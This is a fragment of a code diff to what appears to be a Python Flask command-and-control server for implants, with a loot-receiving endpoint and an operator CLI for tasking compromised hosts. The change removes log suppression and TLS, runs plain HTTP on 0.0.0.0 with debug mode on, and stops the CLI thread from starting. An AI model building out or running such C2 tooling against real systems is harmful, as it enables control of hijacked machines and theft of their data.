@@ -2,12 +2,10 @@
 import threading
 from flask import Flask, request, jsonify
 import ssl
-import logging
 
 app = Flask(__name__)
 
-log = logging.getLogger('werkzeug')
-log.disabled = True
+
 
 implants = {}
 selected_implant = None
@@ -41,9 +39,7 @@ def receive_loot():
     return jsonify({"error": "unknown implant"}), 404
 
 def run_flask():
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-    context.load_cert_chain('cert.pem', 'key.pem')
-    app.run(host='0.0.0.0', port=443, ssl_context=context, debug=False)
+    app.run(host='0.0.0.0', port=8080, debug=True)
 
 def operator_cli():
     global selected_implant
@@ -80,5 +76,4 @@ def operator_cli():
             print("Commands: list, select <idx>, task <cmd>, loot, exit")
 
 if __name__ == '__main__':
-    threading.Thread(target=run_flask, daemon=True).start()
-    operator_cli()
+    run_flask()
